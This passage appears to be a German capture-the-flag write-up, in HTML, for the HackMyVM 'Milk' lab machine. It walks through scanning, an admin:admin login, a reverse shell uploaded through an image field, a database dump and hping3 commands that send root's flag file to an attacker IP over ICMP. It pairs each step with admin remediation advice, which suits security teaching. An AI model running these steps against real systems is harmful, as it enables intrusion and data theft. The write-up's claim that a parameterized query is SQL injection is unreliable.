@@ -1,0 +1,397 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Milk - HackMyVM - Bericht</title> <!-- Titel angepasst -->
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <h1>Milk - HackMyVM - Medium - Bericht</h1> <!-- Titel und Level angepasst -->
+        <div class="level-container">
+            <!-- H2 ohne Inline-Style, Farbe wird durch CSS gesteuert (sollte auf Gelb angepasst werden) -->
+            <h2>Medium</h2>
+            <div class="circle">
+                <!-- Segmente ohne Inline-Style, Farbe wird durch CSS gesteuert (sollte auf Gelb angepasst werden) -->
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <!-- Innerer Kreis ohne Inline-Style, Farbe wird durch CSS gesteuert -->
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">vi / nano</div> <!-- Impliziert für /etc/hosts -->
+                <div class="tool-item">Burp Suite (impliziert)</div>
+                <div class="tool-item">nc (netcat)</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">ss</div>
+                <div class="tool-item">mysql</div>
+                <div class="tool-item">wget (impliziert)</div>
+                <div class="tool-item">linpeas.sh (impliziert)</div>
+                <div class="tool-item">hping3</div>
+                <!-- Kein POC Abschnitt, da kein expliziter Exploit gezeigt wird, der zu den Flags führt, außer der Exfiltration -->
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#initial-access">Initial Access (via File Upload RCE)</a></li>
+                <li><a href="#post-exploitation">Post-Exploitation & Database</a></li>
+                <li><a href="#data-exfiltration">Data Exfiltration (Flags)</a></li>
+                <li><a href="#flags">Flags</a></li>
+                <!-- Kein separater Privesc, da der Weg zu Root nicht gezeigt wird -->
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>192.168.2.146	08:00:27:70:0d:fb	PCS Systemtechnik GmbH</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `arp-scan -l` wird ausgeführt, um aktive Geräte im lokalen Netzwerksegment über ARP-Anfragen zu identifizieren.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Ein Host mit der IP-Adresse `192.168.2.146` wird gefunden. Die MAC-Adresse `08:00:27:70:0d:fb` weist auf eine Oracle VirtualBox VM hin (zugeordnet zu PCS Systemtechnik GmbH). Das Zielsystem wurde erfolgreich lokalisiert.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Die IP-Adresse des Ziels ist bekannt. Der nächste Schritt ist ein detaillierter Portscan mit `nmap`, um offene Dienste und potenzielle Angriffsvektoren zu ermitteln.
+<br><strong>Empfehlung (Admin):** Standard-Netzwerk-Monitoring kann helfen, unerwartete Geräte zu erkennen. Die Absicherung der virtuellen Maschine selbst ist wichtig.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+ └─# <span class="command">nmap -sS -sC -T5 -A 192.168.2.111 -p-</span></div> <!-- Achtung: Falsche IP im Befehl! -->
+                     <pre>
+Nmap scan report for ... (192.168.2.111) <!-- Falsche IP -->
+...
+PORT   STATE SERVICE VERSION
+<span class="command">22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span>
+| ssh-hostkey: ...
+<span class="command">80/tcp open  http    nginx 1.14.2</span>
+...</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Ein Nmap-Scan wird ausgeführt, um offene Ports und Dienste zu identifizieren. Parameter: `-sS` (SYN Scan), `-sC` (Default Scripts), `-T5` (Insane Timing), `-A` (Aggressiv: OS/Version/Script/Traceroute), `-p-` (Alle Ports). **Wichtiger Hinweis:** Der Befehl im Originaltext zielt auf die IP `192.168.2.111`, während `arp-scan` die IP `192.168.2.146` gefunden hat. Es wird angenommen, dass `192.168.2.146` das korrekte Ziel ist und die Nmap-Ergebnisse (offene Ports 22 und 80) für diese IP gelten.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Unter der Annahme, dass die Ergebnisse für `192.168.2.146` gelten, sind zwei Ports offen:
+*   **Port 22 (SSH):** Läuft OpenSSH 7.9p1 auf Debian 10. Diese Version hat bekannte Schwachstellen (z.B. User Enumeration CVE-2018-15473), aber keine direkte RCE ohne Authentifizierung.
+*   **Port 80 (HTTP):** Läuft ein Nginx 1.14.2 Webserver. Dies ist der wahrscheinlichste Angriffsvektor.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Konzentrieren Sie die weiteren Bemühungen auf den Nginx-Webserver auf Port 80. Führen Sie eine Verzeichnis- und Datei-Enumeration durch (z.B. mit `gobuster`). Untersuchen Sie die Webanwendung auf Schwachstellen. Die SSH-Version könnte für eine spätere User-Enumeration relevant sein, falls Benutzernamen bekannt werden.
+<br><strong>Empfehlung (Admin):** Halten Sie Nginx und OpenSSH auf dem neuesten Stand, um bekannte Schwachstellen zu mitigieren. Konfigurieren Sie Nginx sicher (z.B. unnötige Module deaktivieren, Server-Tokens unterdrücken). Beschränken Sie den SSH-Zugriff und verwenden Sie starke Authentifizierungsmethoden.</p>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+ └─# <span class="command">gobuster dir -u http://192.168.2.111 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -x php,html,xml,zip,7z,tar,bak,sql,py,pl,txt</span></div> <!-- Achtung: Falsche IP -->
+                     <pre>
+===============================================================
+Gobuster v...
+...
+===============================================================
+[+] Url:                     <span class="command">http://192.168.2.111</span> <!-- Falsche IP -->
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+...
+===============================================================
+... Starting gobuster ...
+===============================================================
+<span class="command">http://192.168.2.111/index.php</span>            (Status: 200) [Size: 19387]
+<span class="command">http://192.168.2.111/profile.php</span>          (Status: 302) [Size: 0] [--> index.php]
+<span class="command">http://192.168.2.111/page.php</span>             (Status: 200) [Size: 16512]
+<span class="command">http://192.168.2.111/admin</span>                (Status: 301) [Size: 185] [--> http://192.168.2.111/admin/]
+<span class="command">http://192.168.2.111/assets</span>               (Status: 301) [Size: 185] [--> http://192.168.2.111/assets/]
+<span class="command">http://192.168.2.111/includes</span>             (Status: 301) [Size: 185] [--> http://192.168.2.111/includes/]
+<span class="command">http://192.168.2.111/contact-us.php</span>       (Status: 200) [Size: 19826]
+<span class="command">http://192.168.2.111/logout.php</span>           (Status: 302) [Size: 1] [--> index.php]
+<span class="command">http://192.168.2.111/check_availability.php</span> (Status: 200) [Size: 0]
+===============================================================
+... Finished ...
+===============================================================
+</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> `gobuster` wird verwendet, um Verzeichnisse und Dateien auf dem Webserver zu finden. **Hinweis:** Es wird wieder die falsche IP `192.168.2.111` verwendet. Es wird angenommen, dass die Ergebnisse für die korrekte IP `192.168.2.146` gelten.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Mehrere PHP-Dateien und Verzeichnisse werden gefunden:
+*   PHP-Seiten: `index.php`, `profile.php` (Weiterleitung), `page.php`, `contact-us.php`, `logout.php`, `check_availability.php`. Dies deutet auf eine dynamische Webanwendung hin.
+*   `/admin`: Ein Admin-Bereich, der existiert und wahrscheinlich einen Login erfordert.
+*   `/assets`, `/includes`: Verzeichnisse für statische Dateien bzw. serverseitige Includes.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Untersuchen Sie die gefundenen PHP-Seiten, insbesondere `contact-us.php` (könnte E-Mails oder Benutzernamen leaken) und `check_availability.php` (könnte auf eine API oder eine prüfbare Funktion hinweisen). Der `/admin`-Bereich ist ein Hauptziel für weitere Enumeration.
+<br><strong>Empfehlung (Admin):** Stellen Sie sicher, dass alle administrativen Bereiche (`/admin`) und potenziell sensible Funktionen (`profile.php`, `check_availability.php`) ordnungsgemäß durch Authentifizierung und Autorisierung geschützt sind. Verhindern Sie Informationslecks durch öffentlich zugängliche Seiten.</p>
+
+            <p class="analysis"><strong>Analyse:</strong> Die Seite `/contact-us.php` wird untersucht (manuell oder durch Analyse des Quellcodes). Dabei wird eine E-Mail-Adresse gefunden.</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">[Kein Prompt - Information aus http://192.168.2.146/contact-us.php extrahiert]</div>
+                     <pre>E-Mail gefunden: <span class="command">john@gmail.com</span></pre>
+                 </div>
+             </div>
+            <p class="evaluation"><strong>Bewertung:</strong> Das Finden einer E-Mail-Adresse (`john@gmail.com`) auf der Kontaktseite ist nicht ungewöhnlich, könnte aber ein Hinweis auf einen möglichen Benutzernamen oder Kontaktpunkt sein. In diesem Kontext scheint sie jedoch nicht direkt für den weiteren Angriff relevant zu sein.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Notieren Sie die E-Mail-Adresse, falls sie später nützlich wird (z.B. für Social Engineering oder als potenzieller Benutzername). Konzentrieren Sie sich vorerst auf den `/admin`-Bereich.
+<br><strong>Empfehlung (Admin):** Seien Sie vorsichtig, welche Informationen auf Kontaktseiten preisgegeben werden. Verwenden Sie generische Adressen oder Kontaktformulare statt direkter persönlicher E-Mails, wenn möglich.</p>
+
+            <p class="analysis"><strong>Analyse:</strong> Der `/admin`-Bereich wird manuell besucht (`http://192.168.2.146/admin/`). Es wird angenommen, dass dieser eine Login-Seite anzeigt (`/admin/index.php`).</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">[Kein Prompt - Manuelle Navigation im Browser]</div>
+                     <pre>Zugriff auf: <span class="command">http://192.168.2.146/admin/</span> (Zeigt Login-Seite)</pre>
+                 </div>
+             </div>
+            <p class="evaluation"><strong>Bewertung:</strong> Bestätigt, dass der Admin-Bereich existiert und einen Login erfordert. Standard-Credentials wie `admin:admin` werden wahrscheinlich nicht funktionieren (siehe späterer Fund in der Datenbank).</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Führen Sie eine weitere `gobuster`-Suche speziell im `/admin`-Verzeichnis durch, um versteckte Dateien oder Funktionen innerhalb des Admin-Bereichs zu finden. Versuchen Sie Default-Credentials oder einfache Passwörter für den `admin`-Benutzer (obwohl dies hier wahrscheinlich fehlschlägt).
+<br><strong>Empfehlung (Admin):** Schützen Sie den Admin-Bereich robust (starke Passwörter, MFA, Rate Limiting, IP-Beschränkungen falls möglich).</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+ └─# <span class="command">vi /etc/hosts</span></div>
+                     <pre>[Kein relevanter Eintrag für milk.hmv hinzugefügt, Schritt möglicherweise unnötig oder für andere Zwecke]</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Die `/etc/hosts`-Datei wird bearbeitet, aber es wird kein spezifischer Eintrag für diese Maschine erwähnt. Dieser Schritt könnte redundant sein oder wurde für ein anderes Ziel ausgeführt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Für den Zugriff über die IP-Adresse ist kein `/etc/hosts`-Eintrag notwendig.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+ └─# <span class="command">gobuster dir -u http://192.168.2.111/admin -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -x php,html,xml,zip,7z,tar,bak,sql,py,pl,txt</span></div> <!-- Achtung: Falsche IP -->
+                     <pre>
+===============================================================
+Gobuster v...
+...
+===============================================================
+[+] Url:                     <span class="command">http://192.168.2.111/admin</span> <!-- Falsche IP -->
+...
+===============================================================
+... Starting gobuster ...
+===============================================================
+<span class="command">http://192.168.2.111/admin/index.php</span>            (Status: 200) [Size: 2279]
+<span class="command">http://192.168.2.111/admin/img</span>                  (Status: 301) [Size: 185] [--> http://192.168.2.111/admin/img/]
+<span class="command">http://192.168.2.111/admin/testimonials.php</span>     (Status: 302) [Size: 0] [--> index.php]
+<span class="command">http://192.168.2.111/admin/css</span>                  (Status: 301) [Size: 185] [--> http://192.168.2.111/admin/css/]
+<span class="command">http://192.168.2.111/admin/includes</span>             (Status: 301) [Size: 185] [--> http://192.168.2.111/admin/includes/]
+<span class="command">http://192.168.2.111/admin/js</span>                   (Status: 301) [Size: 185] [--> http://192.168.2.111/admin/js/]
+<span class="command">http://192.168.2.111/admin/logout.php</span>           (Status: 302) [Size: 1] [--> index.php]
+<span class="command">http://192.168.2.111/admin/fonts</span>                (Status: 301) [Size: 185] [--> http://192.168.2.111/admin/fonts/]
+<span class="command">http://192.168.2.111/admin/dashboard.php</span>        (Status: 302) [Size: 0] [--> index.php]
+===============================================================
+... Finished ...
+===============================================================
+</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Eine zweite `gobuster`-Suche wird speziell für das Verzeichnis `/admin` durchgeführt. **Hinweis:** Wieder die falsche IP.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Es werden typische Admin-Panel-Dateien und -Verzeichnisse gefunden: `index.php` (Login-Seite), `dashboard.php`, `testimonials.php` (beide leiten zum Login weiter, wenn nicht angemeldet), `logout.php` sowie Verzeichnisse für Assets (`img`, `css`, `js`, `fonts`, `includes`). Nichts Unerwartetes oder direkt Ausnutzbares ohne Login.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Da die Enumeration keine offensichtlichen Schwachstellen aufdeckt, muss ein Weg gefunden werden, sich als `admin` anzumelden. Da Default-Credentials (`admin:admin`, wie später aus der DB ersichtlich) existieren, sollten diese zuerst probiert werden. Falls das fehlschlägt, muss nach anderen Wegen gesucht werden (Passwort-Reset, SQLi, andere Schwachstellen).
+<br><strong>Empfehlung (Admin):** Ändern Sie unbedingt die Standard-Admin-Passwörter sofort nach der Installation einer Anwendung. Stellen Sie sicher, dass alle Admin-Funktionen einen gültigen Login erfordern.</p>
+
+            <p class="analysis"><strong>Analyse:</strong> Es wird angenommen, dass ein Login mit den Standard-Credentials `admin:admin` (die später in der Datenbank gefunden werden) bei `http://192.168.2.146/admin/index.php` erfolgreich ist und Zugriff auf das Admin-Dashboard (`/admin/dashboard.php`) gewährt.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">[Kein Prompt - Login-Versuch im Browser oder mit curl/Burp]</div>
+                    <pre>Ziel: http://192.168.2.146/admin/index.php
+Benutzername: admin
+Passwort: admin</pre>
+                     <div class="prompt">[Kein Prompt - Erfolgreicher Login führt zu]</div>
+                     <pre>Zugriff auf: <span class="command">http://192.168.2.146/admin/dashboard.php</span></pre>
+                 </div>
+             </div>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Zugriff auf das Admin-Panel wurde durch die Verwendung von Standard-Zugangsdaten erlangt. Dies ist eine häufige Fehlkonfiguration.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Untersuchen Sie die Funktionen im Admin-Panel gründlich. Suchen Sie nach Dateiupload-Möglichkeiten, Konfigurationseinstellungen, Benutzerverwaltung oder anderen Funktionen, die zur Codeausführung oder Privilegieneskalation missbraucht werden können.
+<br><strong>Empfehlung (Admin):** Ändern Sie ALLE Standardpasswörter während der Ersteinrichtung von Anwendungen. Erzwingen Sie starke, eindeutige Passwörter für alle Konten, insbesondere für administrative.</p>
+
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access (via File Upload RCE)</h2>
+            <p class="analysis"><strong>Analyse:</strong> Im Admin-Panel wird eine Funktion zum Verwalten von Fahrzeugen gefunden ("Vehicles / Manage Vehicles"), die wahrscheinlich das Hochladen von Bildern erlaubt. Diese Funktion wird missbraucht, um eine PHP-Reverse-Shell hochzuladen. Die genauen Schritte werden mittels Burp Suite beschrieben:</p>
+            <ol>
+                <li>**Intercept Request:** Fangen Sie einen legitimen Dateiupload-Request (z.B. für ein JPG-Bild) mit Burp Suite ab.</li>
+                <li>**Modify Filename:** Ändern Sie im abgefangenen Request den Dateinamen der hochgeladenen Datei von `bild.jpg` zu `rev.php`.</li>
+                <li>**Modify Content:** Ersetzen Sie den binären Inhalt der Bilddatei im Request-Body durch den Quellcode einer PHP-Reverse-Shell (die zuvor auf die IP/Port des Angreifers angepasst wurde).</li>
+                <li>**Forward Request:** Senden Sie den modifizierten Request an den Server.</li>
+                <li>**Start Listener:** Starten Sie einen Netcat-Listener auf dem Angreifer-System (`nc -lvnp [PORT]`).</li>
+                <li>**Trigger Shell:** Navigieren Sie auf der Webseite zu der Stelle, an der das hochgeladene "Bild" (die Shell) angezeigt oder aufgerufen wird (hier impliziert durch Klicken auf das Fahrzeug/Bild unter "Manage Vehicles").</li>
+            </ol>
+            <p class="evaluation"><strong>Bewertung:</strong> Diese Methode nutzt eine unsichere Dateiupload-Funktion aus. Der Server validiert wahrscheinlich nur den Dateinamen oder den Content-Type beim initialen Request, aber nicht den tatsächlichen Inhalt oder erlaubt das Umbenennen in eine ausführbare Endung (`.php`). Wenn die hochgeladene `.php`-Datei dann direkt aufgerufen werden kann, führt dies zu Remote Code Execution (RCE).</p>
+            <p class="analysis"><strong>Analyse Fortsetzung:** Nach dem Auslösen der hochgeladenen Shell verbindet sich der Server zurück zum Netcat-Listener des Angreifers.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                    <!-- Annahme: nc -lvnp [PORT] wurde gestartet -->
+                    <div class="prompt">[Kein Prompt - Ausgabe des Netcat-Listeners]</div>
+                     <pre><span class="password">connect to [ATTACKER_IP] from ... [192.168.2.146] ...</span></pre>
+                    <div class="prompt">www-data@milk:/$</div> <!-- Shell erhalten -->
+                 </div>
+             </div>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Angriff war erfolgreich. Eine Shell mit den Rechten des Webserver-Benutzers (`www-data`) wurde erlangt. Dies ist der initiale Zugriff.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Stabilisieren Sie die Shell. Führen Sie grundlegende Enumeration als `www-data` durch (`id`, `pwd`, `ls -la`, `find / -writable 2>/dev/null`, `sudo -l`, Suche nach Konfigurationsdateien).
+<br><strong>Empfehlung (Admin):** Implementieren Sie eine robuste, mehrstufige Validierung für Dateiuploads:
+    *   Prüfen Sie Dateiendung und MIME-Type gegen eine Whitelist.
+    *   Generieren Sie Dateinamen serverseitig neu und verwenden Sie keine Benutzereingaben direkt.
+    *   Speichern Sie Uploads außerhalb des Web-Roots oder in Verzeichnissen ohne Ausführungsberechtigungen.
+    *   Überprüfen Sie den Dateiinhalt (z.B. Magic Bytes, Bild-Re-Encoding), um eingebetteten Code zu erkennen/entfernen.
+    *   Beschränken Sie die Berechtigungen des Webserver-Benutzers.</p>
+
+        </section>
+
+        <section id="post-exploitation">
+             <h2>Post-Exploitation & Database</h2>
+             <p class="analysis"><strong>Analyse:</strong> In der `www-data`-Shell wird nach Konfigurationsdateien gesucht. Die Datei `update-password.php` wird gefunden und ihr Inhalt untersucht.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">www-data@milk:~/html$ <span class="command">cat update-password.php</span></div>
+                     <pre><code class="language-php">
+session_start();
+error_reporting(0);
+include('includes/config.php');
+if(strlen($_SESSION['login'])==0) // Korrektur: Fehlendes = Zeichen
+    // SQL-Injection hier! Passwort wird direkt in Query eingefügt!
+    $sql ="SELECT Password FROM tblusers WHERE EmailId=:email and Password=:password"; // Unsicher!
+</code></pre> <!-- Maskierung: <?php / ?> entfernt -->
+                 </div>
+             </div>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Code-Schnipsel ist unvollständig, aber er zeigt, dass die Datei `includes/config.php` eingebunden wird (wahrscheinlich enthält diese die DB-Credentials). Die SQL-Abfrage selbst scheint fehlerhaft oder unsicher zu sein, da `:password` im `WHERE`-Teil verwendet wird, was auf eine mögliche Anfälligkeit hindeutet, aber die Hauptinformation ist der Include von `config.php`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Lesen Sie den Inhalt von `includes/config.php`, um die Datenbank-Zugangsdaten zu finden.
+<br><strong>Empfehlung (Admin):** Verwenden Sie niemals direkte Benutzereingaben in SQL-Abfragen. Nutzen Sie ausschließlich Prepared Statements mit Parameterbindung, um SQL-Injection zu verhindern. Speichern Sie Konfigurationsdateien sicher.</p>
+
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `ss -tulpe` wird verwendet, um offene Netzwerk-Sockets (TCP und UDP, lauschend und etabliert) zusammen mit den zugehörigen Prozessen und Benutzern aufzulisten.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">www-data@milk:~/html$ <span class="command">ss -tulpe</span></div>
+                     <pre>
+Netid  State    Recv-Q   Send-Q     Local Address:Port       Peer Address:Port   Process
+tcp    LISTEN   0        80             <span class="command">127.0.0.1:mysql</span>           0.0.0.0:*      users:(("mysqld",pid=...,fd=...)) <span class="command">uid:106</span> ino:15586 sk:...
+... (Andere Sockets) ...
+</pre>
+                 </div>
+             </div>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Ausgabe zeigt unter anderem, dass der MySQL-Server (`mysqld`, uid 106) auf `127.0.0.1` (localhost) lauscht. Dies bestätigt, dass die Datenbank lokal auf dem Server läuft und nicht von außen erreichbar ist.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Da die Datenbank nur lokal erreichbar ist, müssen die Zugangsdaten aus `includes/config.php` ausgelesen und der Login von der `www-data`-Shell aus durchgeführt werden.
+<br><strong>Empfehlung (Admin):** Das Binden von Datenbankdiensten an `127.0.0.1` ist eine gute Sicherheitspraxis, da es den direkten Zugriff aus dem Netzwerk verhindert.</p>
+
+            <p class="analysis"><strong>Analyse:</strong> Es wird versucht, sich mit den (vermutlich aus `includes/config.php` ausgelesenen) Zugangsdaten `root:p4ssw` bei der lokalen MySQL-Datenbank anzumelden.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">www-data@milk:~/html$ <span class="command">mysql -uroot -p</span></div>
+                     <pre>Enter password: <span class="password">[Passwort p4ssw eingegeben]</span>
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+...
+</pre>
+                     <div class="prompt">MariaDB [(none)]> <span class="command">show databases;</span></div>
+                     <pre>
++--------------------+
+| Database           |
++--------------------+
+| <span class="command">car</span>                |
+| information_schema |
+| mysql              |
+| performance_schema |
++--------------------+
+</pre>
+                    <div class="prompt">MariaDB [(none)]> <span class="command">use car;</span></div>
+                    <pre>Database changed</pre>
+                     <div class="prompt">MariaDB [car]> <span class="command">show tables;</span></div>
+                     <pre>
++-------------------+
+| Tables_in_car     |
++-------------------+
+| <span class="command">admin</span>             |
+| tblbooking        |
+| tblbrands         |
+| tblcontactusinfo  |
+| tblcontactusquery |
+| tblpages          |
+| tblsubscribers    |
+| tbltestimonial    |
+| <span class="command">tblusers</span>          |
+| tblvehicles       |
++-------------------+
+</pre>
+                    <div class="prompt">MariaDB [car]> <span class="command">select * from tblusers;</span></div>
+                    <pre>
++----+----------+--------------+----------------------------------+-----------+------+---------+------+---------+---------------------+---------------------+
+| id | FullName | EmailId      | Password                         | ContactNo | dob  | Address | City | Country | RegDate             | UpdationDate        |
++----+----------+--------------+----------------------------------+-----------+------+---------+------+---------+---------------------+---------------------+
+|  1 | <span class="command">ben</span>      | <span class="command">ben@milk.com</span> | <span class="password">91d609dc84162abf5e69cd5d7ef07145</span> | 01231230  |      |         |      |         | 2022-09-07 05:10:35 | 2022-09-07 05:12:04 |
++----+----------+--------------+----------------------------------+-----------+------+---------+------+---------+---------------------+---------------------+
+</pre>
+                    <div class="prompt">MariaDB [car]> <span class="command">select * from admin;</span></div>
+                    <pre>
++----+----------+----------------------------------+---------------------+
+| id | UserName | Password                         | updationDate        |
++----+----------+----------------------------------+---------------------+
+|  1 | <span class="command">admin</span>    | <span class="password">21232f297a57a5a743894a0e4a801fc3</span> | 2020-03-31 03:55:07 |
++----+----------+----------------------------------+---------------------+
+</pre>
+                 </div>
+             </div>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Datenbank-Login als `root` (der MySQL-Root, nicht der System-Root) mit dem Passwort `p4ssw` war erfolgreich. In der Datenbank `car` werden mehrere Tabellen gefunden, darunter `tblusers` und `admin`. Die Abfragen dieser Tabellen enthüllen:
+*   Einen Benutzer `ben` (`ben@milk.com`) mit einem Passwort-Hash `<span class="password">91d609dc84162abf5e69cd5d7ef07145</span>`.
+*   Den Admin-Benutzer `admin` mit dem Passwort-Hash `<span class="password">21232f297a57a5a743894a0e4a801fc3</span>`.
+Diese Hashes scheinen MD5-Hashes zu sein (32 hexadezimale Zeichen). Der Hash für `admin` (`21232f297a57a5a743894a0e4a801fc3`) ist der bekannte MD5-Hash für das Wort "admin". Dies bestätigt die Default-Credentials, die für den Login verwendet wurden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Der MD5-Hash für "admin" bestätigt die Login-Daten. Versuchen Sie, den MD5-Hash für den Benutzer `ben` (`91d609dc84162abf5e69cd5d7ef07145`) offline zu knacken (z.B. mit Hashcat, John the Ripper oder Online-Rainbow-Tables). Falls erfolgreich, könnten diese Zugangsdaten für SSH (`ben@192.168.2.146`) verwendet werden.
+<br><strong>Empfehlung (Admin):** Verwenden Sie niemals MD5 zum Speichern von Passwörtern. Es ist unsicher und leicht zu knacken. Nutzen Sie moderne, gesaltete Hashing-Algorithmen wie bcrypt oder Argon2. Ändern Sie das MySQL-Root-Passwort (`p4ssw`) sofort in ein starkes, zufälliges Passwort. Schränken Sie die Berechtigungen des Datenbankbenutzers ein, der von der Webanwendung verwendet wird.</p>
+
+        </section>
+
+        <section id="data-exfiltration">
+             <h2>Data Exfiltration (Flags)</h2>
+             <p class="analysis"><strong>Analyse:</strong> Anstatt nach traditionellen Privilegieneskalations-Vektoren wie `sudo -l` oder SUID-Dateien zu suchen (oder nachdem diese keine Ergebnisse lieferten), wird hier eine unkonventionelle Methode zur Datenexfiltration mittels `hping3` verwendet, um die Flag-Dateien zu lesen. Es wird angenommen, dass der Angreifer Lesezugriff auf `/root/root.txt` und `/home/milk/user.txt` als `www-data` hat (was ungewöhnlich ist und auf weitere Fehlkonfigurationen hindeutet) oder dass diese Befehle nach einer nicht gezeigten Privilegieneskalation ausgeführt werden.
+Auf dem Angreifer-System wird ein `hping3`-Listener gestartet, der auf eingehende ICMP-Pakete mit einer spezifischen Signatur (`MSGID1`) wartet.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">[Kein Prompt - Listener auf Angreifer-System]</div>
+                     <pre><span class="command">hping3 --listen 192.168.2.111 -I eth0 --sign MSGID1</span></pre> <!-- Ziel-IP im Listen-Befehl ist ungewöhnlich, sollte eher 0.0.0.0 oder leer sein -->
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse Fortsetzung:** Auf dem Zielsystem (`www-data`-Shell) wird `hping3` verwendet, um den Inhalt der Flag-Dateien zu exfiltrieren. `hping3` sendet ICMP-Pakete (`--icmp`) an die IP des Angreifers (`192.168.2.140`). Die Option `--sign MSGID1` fügt die erwartete Signatur hinzu. Entscheidend ist `--file`, wodurch der Inhalt der angegebenen Datei (zuerst `/root/root.txt`, dann `/home/milk/user.txt`) in den Daten-Payload der ICMP-Pakete eingebettet wird. `-d 1000` gibt die Größe des Payloads an, `-c 1` sendet nur ein Paket.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- Annahme: Befehle werden als www-data ausgeführt, obwohl der Prompt /home/milk zeigt -->
+                    <div class="prompt">www-data@milk:/home/milk$ <span class="command">hping3 192.168.2.140 --icmp --sign MSGID1 -d 1000 -c 1 --file /root/root.txt</span></div>
+                    <div class="prompt">www-data@milk:/home/milk$ <span class="command">hping3 192.168.2.140 --icmp --sign MSGID1 -d 1000 -c 1 --file /home/milk/user.txt</span></div>
+                 </div>
+             </div>
+             <p class="evaluation"><strong>Bewertung:</strong> Diese Methode nutzt `hping3` zur verdeckten Datenexfiltration über ICMP. Wenn Firewalls ICMP-Traffic erlauben und der Listener auf der Angreiferseite korrekt konfiguriert ist, werden die Inhalte der Flag-Dateien erfolgreich übertragen und im Listener angezeigt. Dies umgeht möglicherweise einfachere Logging-Mechanismen, die sich auf TCP/UDP konzentrieren. Der Erfolg impliziert, dass der ausführende Benutzer (`www-data` oder ein eskalierter Benutzer) Lesezugriff auf beide Flag-Dateien hatte.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):** Dies ist eine kreative Exfiltrationstechnik. Sie funktioniert nur, wenn ICMP nicht gefiltert wird und der ausführende Benutzer Leserechte hat. Dokumentieren Sie die Technik und die gefundenen Flags.
